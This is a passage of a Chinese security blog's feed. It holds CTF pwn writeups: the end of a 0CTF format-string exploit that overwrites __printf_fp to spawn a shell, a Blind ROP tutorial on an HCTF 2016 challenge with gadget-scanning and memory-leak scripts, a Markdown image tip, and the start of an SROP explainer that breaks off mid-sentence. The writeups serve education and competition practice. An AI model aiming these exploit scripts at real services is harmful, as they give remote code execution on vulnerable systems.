class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2.7</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so.6_0ed9bad239c74870ed2db31c735132ce&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;info&#x27;</span></span><br><span class="line">io = remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">10002</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">io = remote(<span class="string">&quot;202.120.7.210&quot;</span>,<span class="number">12321</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Which address you wanna read:\n&quot;</span>)</span><br><span class="line">io.sendline(str(<span class="number">0x804A044</span>))  <span class="comment"># .bss:0804A044 stdout@@GLIBC_2_0 dd</span></span><br><span class="line">stdout_addr = hex(io.recvline().rstrip())</span><br><span class="line">libcbase = stdout_addr - libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line">system = libc.symbols[<span class="string">&#x27;system&#x27;</span>] + libcbase</span><br><span class="line">log.info(<span class="string">&#x27;stdout addr :%#x&#x27;</span> % stdout_addr)</span><br><span class="line">log.info(<span class="string">&#x27;libcbase : %#x&#x27;</span> %libcbase)</span><br><span class="line">log.info(<span class="string">&#x27;system addr: %#x&#x27;</span> %system)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Good Bye\n&quot;</span>)</span><br><span class="line">write = &#123;d + <span class="number">148</span>: <span class="number">0x0804A570</span> - <span class="number">0x1c</span>, <span class="number">0x0804A570</span>: system + <span class="number">1</span>&#125; <span class="comment">#:0004A570 __printf_fp     endp</span></span><br><span class="line">payload = <span class="string">&#x27;/bin/sh;&#x27;</span></span><br><span class="line">payload += fmtstr_payload(<span class="number">9</span>, write, len(payload), <span class="string">&#x27;byte&#x27;</span>)</span><br><span class="line">log.info(<span class="string">&#x27;len: %d&#x27;</span> % len(payload))</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> 0CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Markdown中对图片进行居中,设置大小等操作</title>
      <link href="markdown%E5%9B%BE%E7%89%87%E8%AE%BE%E7%BD%AE%E6%96%B9%E6%B3%95.html"/>
      <url>markdown%E5%9B%BE%E7%89%87%E8%AE%BE%E7%BD%AE%E6%96%B9%E6%B3%95.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="设置图片居中"><a href="#设置图片居中" class="headerlink" title="设置图片居中"></a>设置图片居中</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;div align&#x3D;center&gt;</span><br><span class="line">![]()</span><br><span class="line">&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure><h1 id="设置图片大小"><a href="#设置图片大小" class="headerlink" title="设置图片大小"></a>设置图片大小</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;&#x2F;Users&#x2F;soindy&#x2F;Desktop&#x2F;app-components-short-look_2x.png&quot; width&#x3D;&quot;100&quot; height&#x3D;&quot;100&quot; &#x2F;&gt;</span><br></pre></td></tr></table></figure><p>如果使用七牛的图床.比如说按比例缩小50%:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url + ?imageMogr2&#x2F;thumbnail&#x2F;!50p</span><br></pre></td></tr></table></figure><p><a href="http://developer.qiniu.com/docs/v6/api/reference/fop/image/imagemogr2.html">七牛API</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> Markdown </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基础栈溢出复习 四 之 BROP</title>
      <link href="stack-overflow-four-BROP.html"/>
      <url>stack-overflow-four-BROP.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>前两天在360安全客看到了一篇文章，《格式化字符串blind pwn详细教程》，看了下内容，大概就是教我们如何利用格式化串漏洞dump 程序，但是在二进制漏洞中，以及CTF Pwn题型中，还有一种考点？说利用方式吧，叫Bind ROP。对于这些相关的东西，我们其实可以在浏览器搜索到，比如K0师傅<a href="http://bobao.360.cn/learning/detail/3415.html">《BROP Attack之Nginx远程代码执行漏洞分析及利用》</a>，以及mctrain前辈在wooyun社区发布的《Blind Return Oriented Programming (BROP) Attack - 攻击原理》。其实都能很详细看到了解BROP的攻击原理，以及攻击样例。<br>当然这个也是《 基础栈溢出及其利用方式的》系列的一部分。</p><h1 id="什么是BROP"><a href="#什么是BROP" class="headerlink" title="什么是BROP"></a>什么是BROP</h1><p>那么我也只是在这里尽量让大家先明白，什么是BORP，以及BROP的攻击原理，以及在后面放一个最近CTF中，及HCTF –出题人跑路了的PWN题的详细分析。</p><p>BROP 原文：<a href="http://www.scs.stanford.edu/brop/">Blind Return Oriented Programming (BROP) Website</a></p><p>其核心要义就是，通过ROP的方法，远程攻击一个应用程序，劫持程序控制流程。其难点在于，我们并没有程序的源代码以及二进制程序。<br>详细的东西，我也不想再继续搬了，mctrain在文章讲得已经非常不错了，我在这里提供我的drop地址，不过大家少用阿，这玩意儿吃流量 <a href="http://wooyun.bestwing.top:5000/static/drops/tips-3071.html">Blind Return Oriented Programming (BROP) Attack - 攻击原理</a></p><h2 id="大概总结下"><a href="#大概总结下" class="headerlink" title="大概总结下"></a>大概总结下</h2><p>看了 Drops的文章，我们大概可总结一下攻击流程</p><ul><li>如果有Canary 防护，需要通过brute-force暴力破解或者 作者提出的方法“stack reading”</li><li>寻找stop gadget或者叫 hang gadget，这gadgaet使得程序进入了无限循环，并且hang，使得攻击者保持连接状态。（如blocking的系统调用 sleep)</li><li>寻找可以利用的，即potentially useful gadgets。这里指useful指的是具有某些功能，并不会造成crash的gadget</li><li>远程dump内存，（当然如果有格式化串，可以利用那也简便狠多，可以参考安全客文章《格式化字符串blind pwn详细教程》），如果没有，我们可能需要一个<strong>write</strong>的系统调用，传入一个socket文件描述符。<br><code>write(int sock,void *buf,int len)</code><br>转化成4条汇编指令就是<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pop %rdi ret</span><br><span class="line">pop %rsi ret</span><br><span class="line">pop %rdx ret</span><br><span class="line">call write ret</span><br></pre></td></tr></table></figure>依次对应的是 <code>%rdi</code>-&gt;sock <code>%rsi</code>-&gt;buf <code>%rdx</code>-&gt;len<br>在栈上构造好这个四个gadget的内存地址，依次执行顺序调用就可以了（这当然是在我们解决掉Canary之后）<ul><li>在dump 内存的过程中，<code>pop %rdx ret</code>这样的gadget也许不容易找到，所以作者又提出另一种方法，利用 strcmp函数，达到相同效果</li><li>所以之后的任务是：<ul><li>寻找BROP Gadget（注:什么是BROP Gadget 可在Drops仔细阅读）</li><li>找到对用PLT项<h1 id="HCTF-之-出题人失踪了-brop"><a href="#HCTF-之-出题人失踪了-brop" class="headerlink" title="HCTF 之 出题人失踪了 (brop)"></a>HCTF 之 出题人失踪了 (brop)</h1>了解了，攻击流程，以及攻击方法，我们就可以尝试做这个题目了。杭电的师傅已经，把源码公开在github上了。我们可以自己拿下来编译一下。</li></ul></li></ul></li><li>*已知信息**<br>比赛的时候，题目给了ip和端口 其他任何信息都没有。但是后面给出了bof的buffer大小作为提示。<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ checksec</span><br><span class="line">CANARY    : disabled</span><br><span class="line">FORTIFY   : disabled</span><br><span class="line">NX        : ENABLED</span><br><span class="line">PIE       : disabled</span><br><span class="line">RELRO     : Partial</span><br></pre></td></tr></table></figure>而且题目没有开Canary防护，所以我们并不需要突破Canary</li></ul><p>经过测试，当输入的字符超过72字节，程序就不会再打印 No password, No game了。</p><h2 id="首先寻找-stop-gadget"><a href="#首先寻找-stop-gadget" class="headerlink" title="首先寻找 stop gadget"></a>首先寻找 stop gadget</h2><p>这个地方，<strong>muhe</strong>师傅交了我一种方法，那就是利用<code>pwntools</code>的异常处理来检测。因为我们需要return address指向一块代码区域，当程序的执行流跳到那段区域之后，程序并不会crash，而是进入了无限循环，这时程序仅仅是hang在了那里，攻击者能够一直保持连接状态。于是，我们把这种类型的gadget，成为stop gadget，这种gadget对于寻找其他gadgets取到了至关重要的作用。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">10002</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">log_in_file</span>(<span class="params">addr</span>):</span></span><br><span class="line">    <span class="comment">#f = open(&quot;gadgets.txt&quot;,&#x27;a&#x27;)</span></span><br><span class="line">    <span class="comment">#f = open(&#x27;res.txt&#x27;,&#x27;a&#x27;)</span></span><br><span class="line">    f = open(<span class="string">&#x27;puts.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    f.write(<span class="string">&quot;the addr:0x%x\n&quot;</span>%addr)</span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_stop_gadget</span>(<span class="params">addr</span>):</span></span><br><span class="line">    io = remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">10002</span>)</span><br><span class="line">    payload = <span class="string">&quot;A&quot;</span>*<span class="number">72</span> + p64(addr)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;WelCome my friend,Do you know password?&quot;</span>)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        io.recvline()</span><br><span class="line">        <span class="keyword">if</span>(io.recv()!=<span class="literal">None</span>):</span><br><span class="line">            log.info(<span class="string">&quot;alie! at 0x%x&quot;</span> %addr)</span><br><span class="line">            log_in_file(addr)</span><br><span class="line">            io.close()</span><br><span class="line">    <span class="keyword">except</span> EOFError <span class="keyword">as</span> e:</span><br><span class="line">            io.close()</span><br><span class="line">            log.info(<span class="string">&quot;the connection is close at 0x%x&quot;</span> %addr)</span><br><span class="line">start = <span class="number">0x400000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    start +=<span class="number">1</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;[*] Rand:&#123;0&#125;&quot;</span>.format(start)</span><br><span class="line">    find_stop_gadget(start)</span><br><span class="line">    <span class="keyword">if</span> start &gt;<span class="number">0x40300000</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>可能会得到多个gadget，找个好用的就可以了。</p><h2 id="找useful-gadget"><a href="#找useful-gadget" class="headerlink" title="找useful gadget"></a>找useful gadget</h2><p>由于这个题目实质是调用puts函数，不是write函数，所以我们并不需要三个gadget，只需要1个 <code>pop rdi;ret</code>就足够了</p><hr><p>%rdi，%rsi，%rdx，%rcx，%r8，%r9 用作函数参数，依次对应第1参数，第2参数。。。</p><hr><p>那么如何得到一个 <code>pop rdi;ret</code>呢？我们设想，在64位的ELF中，通常存在一个pop r15;ret 对应的字节码为41 5f c3。后两字节码5f c3对应的汇编为pop rdi;ret。<br>如果有存在一个地址 addr，满足</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Payload1 = <span class="string">&#x27;a&#x27;</span>*<span class="number">72</span> + l64(addr<span class="number">-1</span>)+l64(<span class="number">0</span>)+l64(ret) </span><br><span class="line">Payload2 = <span class="string">&#x27;a&#x27;</span>*<span class="number">72</span> + l64(addr)+l64(<span class="number">0</span>)+l64(ret) </span><br><span class="line">Payload3 = <span class="string">&#x27;a&#x27;</span>*<span class="number">72</span> + l64(addr+<span class="number">1</span>) +l64(ret) </span><br></pre></td></tr></table></figure><p>ret是一个返回函数，且有输出信息。那么我们就可以得到addr，即<code>pop rdi;ret</code></p><hr><p>在64位ELF中，通常存在一个pop r15；ret，对应的字节码为41 5f c3。后两字节码5f c3对应的汇编为pop rdi;ret。<br>如果addr就是指向的5f，那么addr-1就是指向41，Payload1 = ‘a’*72 + l64(addr-1)+l64(0)+l64(0x400711) ，41和5f组成一个指令，pop r15出来，后面接返回地址0x400711，栈平衡满足要求。Payload2 = ‘a’*72 + l64(addr)+l64(0)+l64(0x400711) ，pop rdi出来，也能正常返回。Payload3 = ‘a’*72 + l64(addr+1) +l64(0x400711) ，addr+1指向c3即ret，直接返回后返回0x400711</p><hr><p>于是，我先去寻找这么一个ret，返回有输出信息。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ret_addr</span>(<span class="params">addr</span>):</span></span><br><span class="line">    io = remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">10002</span>)</span><br><span class="line">    payload = <span class="string">&#x27;A&#x27;</span>*<span class="number">72</span> +p64(addr) + p64(stop_gadget)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;WelCome my friend,Do you know password?&quot;</span>)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        io.recvline()</span><br><span class="line">        <span class="keyword">if</span> (io.recv()!=<span class="literal">None</span>):</span><br><span class="line">            <span class="keyword">print</span> io.recv()</span><br><span class="line">        <span class="comment"># if &quot;No password, no game&quot; in io.recv():</span></span><br><span class="line">            io.info(<span class="string">&quot;find gadgets at 0x%x&quot;</span> % addr)</span><br><span class="line">            log_in_file(addr)</span><br><span class="line">            <span class="keyword">print</span> <span class="string">&quot;[*] the ret addr at 0x%x&quot;</span> % (addr)</span><br><span class="line">            io.close()</span><br><span class="line">    <span class="keyword">except</span> EOFError <span class="keyword">as</span> e:</span><br><span class="line">        io.close()</span><br><span class="line">        log.info(<span class="string">&quot;the connection is close at 0x%x&quot;</span> %addr)</span><br><span class="line">start = <span class="number">0x400000</span></span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    start += <span class="number">1</span></span><br><span class="line">    ret_addr(start)</span><br><span class="line">    count += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> count &gt;<span class="number">0x1000</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>有了 ret，于是我可以开始寻找 <code>pop rdi;ret</code>了。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_useful_gadget</span>(<span class="params">addr</span>):</span></span><br><span class="line"></span><br><span class="line">    io = remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">10002</span>)</span><br><span class="line">    payload1 = <span class="string">&#x27;A&#x27;</span>*<span class="number">72</span> +p64(addr<span class="number">-1</span>) + p64(<span class="number">0</span>)+p64(ret)+p64(stop_gadget)</span><br><span class="line">    payload2 = <span class="string">&#x27;A&#x27;</span>*<span class="number">72</span> +p64(addr) + p64(<span class="number">0</span>)+p64(ret)+p64(stop_gadget)</span><br><span class="line">    payload3 = <span class="string">&#x27;A&#x27;</span>*<span class="number">72</span> +p64(addr+<span class="number">1</span>) +p64(ret)+p64(stop_gadget)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;WelCome my friend,Do you know password?&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        io.sendline(payload1)</span><br><span class="line">        <span class="keyword">if</span> io.recvuntil(<span class="string">&quot;WelCome my friend,Do you know password?&quot;</span>):</span><br><span class="line">            io.sendline(payload2)</span><br><span class="line">            <span class="keyword">if</span> io.recvuntil(<span class="string">&quot;WelCome my friend,Do you know password?&quot;</span>):</span><br><span class="line">                io.sendline(payload3)</span><br><span class="line">                <span class="keyword">if</span> io.recvuntil(<span class="string">&quot;WelCome my friend,Do you know password?&quot;</span>):</span><br><span class="line">                    io.info(<span class="string">&quot;find gdgets at 0x%x&quot;</span> % addr)</span><br><span class="line">                    log_in_file(addr)</span><br><span class="line">                    io.close()</span><br><span class="line">    <span class="keyword">except</span> EOFError <span class="keyword">as</span> e:</span><br><span class="line">        io.close()</span><br><span class="line">        log.info(<span class="string">&quot;the connection is close at 0x%x&quot;</span> %addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">start = <span class="number">0x400000</span></span><br><span class="line"><span class="comment"># count = 0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    start += <span class="number">1</span></span><br><span class="line">    get_useful_gadget(start)</span><br></pre></td></tr></table></figure><p>找到<code>pop rdi;ret </code>了 ，gadget 的需求我们达到了。</p><h2 id="dump-程序"><a href="#dump-程序" class="headerlink" title="dump 程序"></a>dump 程序</h2><p>照理，这个时候我们应该可以开始dump程序了，但是紧接着一个问题来了，我们不知道<code>put_plt</code>的地址。我们知道，puts函数能打印字符串，于是我们设想构造一个payload来验证得到的是不是<code>puts_plt</code>的地址，例如</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;A&#x27;</span>*<span class="number">72</span> +p64(pop_rdi_ret)+p64(<span class="number">0x400000</span>)+p64(addr)+p64(stop_gadget)</span><br></pre></td></tr></table></figure><p>如果打印前四个\字符为 \x7fELF，则addr为<code>puts_plt</code>。<br> 我找到的是 <code>pop_rdi_ret = 0x4005d6</code></p><p>有了 gadget 和put_plt，我们就可以着手dump程序了。<br>首先我们需要构造一个leak的函数：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">72</span> + p64(pop_rdi_ret) +p64(addr) + p64(puts_plt) +p64(stop_gadget)</span><br></pre></td></tr></table></figure><p>这样就可以开始leak，但是还有一个问题，如果对一个\x00的地址进行leak，返回是没有结果的，因此如果返回没有结果，我们就可以确定这个地址的值为\x00，所以可以设置为\x00然后将地址加1进行dump。<br>所以我们需要一个判断：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> data == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">    data = <span class="string">&#x27;\x00&#x27;</span></span><br></pre></td></tr></table></figure><p>基本这样，我们就可以dump文件了，当文件dump下来以后，我们就能很容易的得到一些got信息，那样我们可以更容易的去起shell</p><hr><p>只要分别从0x400000和0x600000开始dump就可以。</p><hr><h2 id="leak-获取libc"><a href="#leak-获取libc" class="headerlink" title="leak 获取libc"></a>leak 获取libc</h2><p>当我们已经获取了got表信息后，那么我就可以进一步去leak函数，用<a href="http://libcdb.com/search?symbolA=__libc_start_main&addressA=0xb74a43e0&symbolB=setsockopt&addressB=0xb757c7b0">search_Libc</a>或者自己收集的libc 库查找相应的libc。那么我就可以进一步查询偏移，就可以构造payload 起shell了。</p><p>leak payload 也是相似的，就不重复了。<br>当然，我们这里也可以利用Pwntools的工具 Dynelf 来leak查询system地址，然后找一个地址写入<code>/bin/sh\x00</code>。</p><h2 id="最后一步就可以起shell了。"><a href="#最后一步就可以起shell了。" class="headerlink" title="最后一步就可以起shell了。"></a>最后一步就可以起shell了。</h2><p>剩下的内容基本和我们一般的leak info 题目是一样的。</p><p>与我前面的文章，PlaidCTF 2013: ropasaurusrex的利用方式基本相同，由于篇幅原因就不继续写下去了。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li>HCTF 源码 <a href="https://github.com/zh-explorer/hctf2016-brop/blob/master/main.c">https://github.com/zh-explorer/hctf2016-brop/blob/master/main.c</a></li><li>muhe博客 <a href="http://o0xmuhe.me/2017/01/22/Have-fun-with-Blind-ROP/">http://o0xmuhe.me/2017/01/22/Have-fun-with-Blind-ROP/</a></li><li>以及队内 师傅的Writeup</li></ul></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Summary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基础栈溢出复习 三 之 SROP</title>
      <link href="stack-overflow-three-SROP.html"/>
      <url>stack-overflow-three-SROP.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>承接上一篇，这篇学习SROP<br>最近出现SROP的题目，就是XCTF -NJCTF中的 <a href="http://bobao.360.cn/ctf/learning/188.html">Pwn300-233</a><br> 当然，虽然出题人是这么出的，但是也还是有非预期做法的。比如<em>Joker</em>师傅的针对这个题目的强行解决方案，强行猜libc base 然后暴力跑，用ROP 解决。<br>那么 SROP是什么，与普通的ROP有什么区别呢?我们可以开始学习了。</p><h1 id="什么是SROP"><a href="#什么是SROP" class="headerlink" title="什么是SROP"></a>什么是SROP</h1><p>SROP: Sigreturn Oriented Programming  系统Signal Dispatch之前会将所有寄存器压入栈，然后调用signal handler，signal handler返回时会将栈的内容还原到寄存器。 如果事先填充栈，然后直接调用signal handler，那在返回的时候就可以控制寄存器的值。</p><p>首先，我们得先了解一下signal的调用流程，那么我就能大概了解SROP的利用原理。</p><p>正如mctrain，在他的<a href="http://www.freebuf.com/articles/network/87447.html">《Sigreturn Oriented Programming (SROP) Attack攻击原理》</a>文章里所提到的，当内核向某个进程发起（deliver）一个signal，该进程会被暂时挂起（suspend），进入内核（1），然后内核为该进程保存相应的上下文，跳转到之前注册好的signal handler中处理相应signal（2），当signal handler返回之后（3），内核为该进程恢复之前保存的上下文，最后恢复进程的执行（4）。<br><a href="http://oayoilchh.bkt.clouddn.com/17-3-21/35564144-file_1490109597511_10b81.png" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/17-3-21/35564144-file_1490109597511_10b81.png"></a><br>在这四步过程中，第三步是关键，即如何使得用户态的signal handler执行完成之后能够顺利返回内核态。在类UNIX的各种不同的系统中，这个过程有些许的区别，但是大致过程是一样的。</p><p>那么，我们是如何利用这个系统调用来做一些不可告人的事情的呢？<br>在singnal中可以说是，有两个层次，一个是用户，一个是内核层次，我们也可以将这个过程简单的看作。</p><ul><li>User code</li><li>singnal handler</li><li>sigreturn<br>如果在mctrain文章中看懂了，signal的调用流程，那么我们就可以讲讲，如何去利用攻击，即我们可以讲讲他的攻击流程。<h2 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h2></li></ul><hr><p>注： 以下图片内容均来自<a href="https://www.slideshare.net/AngelBoy1/sigreturn-ori">https://www.slideshare.net/AngelBoy1/sigreturn-ori</a> 的PDF</p><ol><li>当内核发起signal<br> <a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/bof-3-01.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/bof-3-01.png"></a></li><li>这个时候，我们可以看到栈还并未没push数据，以及ip仍然在User code上。</li><li>将数据push到栈中时<br> <a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/srop-02.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/srop-02.png"></a></li><li>将sigreturn syscall的位置 push 进栈<br> <a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/srop-03.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/srop-03.png"></a></li><li>紧接着程序流程跳转至signal handler<br> <a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/srop-04.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/srop-04.png"></a></li><li>从signal handler 返回<br> <a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/srop-05.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/srop-05.png"></a></li><li>然后流程又跳转至 sigreturn code<br> <a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/srop-06.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/srop-06.png"></a></li><li>执行 singreturn syscall<br> <a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/srop-07.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/srop-07.png"></a></li><li>stack 即栈上的内容全部 pop 回register ，流程又重新回到 user code<br> <a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/srop-08.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/srop-08.png"></a></li><li>至此，我们基本完成了攻击，我们可以大概总结下，<br>我们需要的攻击条件<br>第一，攻击者可以通过stack overflow等漏洞控制栈上的内容；<br>第二，需要知道栈的地址（比如需要知道自己构造的字符串<code>/bin/sh</code>的地址）；<br>第三，需要知道<code>syscall</code>指令在内存中的地址；<br>第四，需要知道<code>sigreturn</code>系统调用的内存地址。<br>当然，更详细的，如<em>利用SROP构造系统调用串（System call chains）</em>依旧可以从mctrain，在他的<a href="http://www.freebuf.com/articles/network/87447.html">《Sigreturn Oriented Programming (SROP) Attack攻击原理》</a>文章找到，我们这里的重点并不是SROP，而是做SROP CTF题。</li></ol><p>SROP构造，及攻击流程概括的来讲就是：</p><ul><li>伪造sigcontext 结构，push进stack中</li><li>设置ret address在sigreturn 